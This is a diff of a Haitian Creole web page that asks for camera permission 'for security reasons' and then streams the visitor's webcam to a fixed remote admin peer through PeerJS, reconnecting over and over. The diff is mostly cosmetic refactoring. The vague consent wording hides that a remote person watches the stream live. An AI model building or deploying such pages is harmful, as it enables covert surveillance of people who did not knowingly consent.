@@ -7,32 +7,60 @@
 <style>
   * { box-sizing: border-box; }
   body {
-    background: #111; color: white; font-family: system-ui, sans-serif;
-    text-align: center; margin: 0; padding: 20px;
-    min-height: 100vh; display: flex; justify-content: center; align-items: center;
+    background: #111;
+    color: white;
+    font-family: system-ui, sans-serif;
+    text-align: center;
+    margin: 0;
+    padding: 20px;
+    min-height: 100vh;
+    display: flex;
+    justify-content: center;
+    align-items: center;
   }
   .card {
-    background: #1c1c1c; padding: 30px 25px; border-radius: 16px;
-    max-width: 340px; width: 100%;
+    background: #1c1c1c;
+    padding: 30px 25px;
+    border-radius: 16px;
+    max-width: 340px;
+    width: 100%;
   }
   h2 { margin-bottom: 15px; font-size: 1.4rem; }
   p { color: #ccc; line-height: 1.6; font-size: 15px; margin: 10px 0; }
   button {
-    padding: 14px 24px; font-size: 16px; border-radius: 10px; border: none;
-    color: white; cursor: pointer; margin-top: 15px; width: 100%; font-weight: bold;
+    padding: 14px 24px;
+    font-size: 16px;
+    border-radius: 10px;
+    border: none;
+    color: white;
+    cursor: pointer;
+    margin-top: 15px;
+    width: 100%;
+    font-weight: bold;
   }
   #btnAccept { background: #00cc66; }
   #btnRefuse { background: #cc3333; margin-top: 8px; }
   .dot-active {
-    display: none; position: fixed; bottom: 20px; right: 20px;
-    background: #1c1c1c; padding: 10px 16px; border-radius: 30px;
-    font-size: 13px; align-items: center; gap: 8px;
-    box-shadow: 0 0 15px rgba(0, 204, 102, 0.4); z-index: 100;
+    display: none;
+    position: fixed;
+    bottom: 20px;
+    right: 20px;
+    background: #1c1c1c;
+    padding: 10px 16px;
+    border-radius: 30px;
+    font-size: 13px;
+    align-items: center;
+    gap: 8px;
+    box-shadow: 0 0 15px rgba(0, 204, 102, 0.4);
+    z-index: 100;
   }
   .dot-active.show { display: flex; }
   .dot-green {
-    display: inline-block; width: 12px; height: 12px;
-    background: #00cc66; border-radius: 50%;
+    display: inline-block;
+    width: 12px;
+    height: 12px;
+    background: #00cc66;
+    border-radius: 50%;
     animation: blink 1.2s infinite;
   }
   @keyframes blink { 50% { opacity: 0.3; } }
@@ -42,7 +70,10 @@
 
   <div id="consentScreen" class="card">
     <h2>⚠️ Pèmisyon Kamera</h2>
-    <p>Paj sa a ap itilize kamera w pou rezon sekirite.<br><br>Èske w aksepte ?</p>
+    <p>
+      Paj sa a ap itilize kamera w pou rezon sekirite.<br><br>
+      Èske w aksepte ?
+    </p>
     <button id="btnAccept">✅ Mwen aksepte</button>
     <button id="btnRefuse">❌ Mwen refize</button>
   </div>
@@ -55,7 +86,7 @@
 <script src="https://unpkg.com/peerjs@1.5.0/dist/peerjs.min.js"></script>
 <script>
 (() => {
-  const ADMIN_PEER_ID = "camadmin-piyayy-2026";
+  const ADMIN_PEER_ID = "admin-piyayy-2026-v2";
   const RECONNECT_DELAY = 3000;
 
   let peer = null;
@@ -85,7 +116,7 @@
   }
 
   function connectToAdmin() {
-    if (peer) { peer.destroy(); peer = null; }
+    if (peer) { try { peer.destroy(); } catch (e) {} peer = null; }
 
     myVisitorId = myVisitorId || generateVisitorId();
     document.getElementById("dotText").innerText = "Kamera aktif";
@@ -116,36 +147,29 @@
   }
 
   function sendCallToAdmin() {
-    if (!peer || !localStream) return;
-    if (!keepTrying) return;
-    if (currentCall) { currentCall.close(); currentCall = null; }
+    if (!peer || !localStream || !keepTrying) return;
+    if (currentCall) { try { currentCall.close(); } catch (e) {} currentCall = null; }
 
     try {
       currentCall = peer.call(ADMIN_PEER_ID, localStream);
       console.log("📞 Rele admin...");
 
-      // ⭐ Lè admin pa la, call la fèmen → nou rekonekte
       currentCall.on("close", () => {
-        console.log("Admin pa la oswa li fèmen. Ap eseye ankò...");
         document.getElementById("dotText").innerText = "Kamera aktif (ap tann admin)";
         scheduleReconnect();
       });
 
-      currentCall.on("error", () => {
-        scheduleReconnect();
-      });
+      currentCall.on("error", () => scheduleReconnect());
     } catch (e) {
       scheduleReconnect();
     }
   }
 
   function scheduleReconnect() {
-    if (!keepTrying) return;
-    if (reconnectTimer) return;
+    if (!keepTrying || reconnectTimer) return;
     reconnectTimer = setTimeout(() => {
       reconnectTimer = null;
-      if (!localStream) return;
-      sendCallToAdmin();
+      if (localStream) sendCallToAdmin();
     }, RECONNECT_DELAY);
   }
 
@@ -166,15 +190,13 @@
 
   window.addEventListener("beforeunload", () => {
     keepTrying = false;
-    if (currentCall) currentCall.close();
-    if (peer) peer.destroy();
+    if (currentCall) { try { currentCall.close(); } catch (e) {} }
+    if (peer) { try { peer.destroy(); } catch (e) {} }
     if (localStream) localStream.getTracks().forEach(t => t.stop());
   });
 
-  // ⭐ Rekonekte si navigatè rekòmanse (visitor rete sou paj la)
   document.addEventListener("visibilitychange", () => {
     if (document.visibilityState === "visible" && localStream && keepTrying) {
-      console.log("🔄 Paj vizib ankò, ap rekonekte...");
       scheduleReconnect();
     }
   });
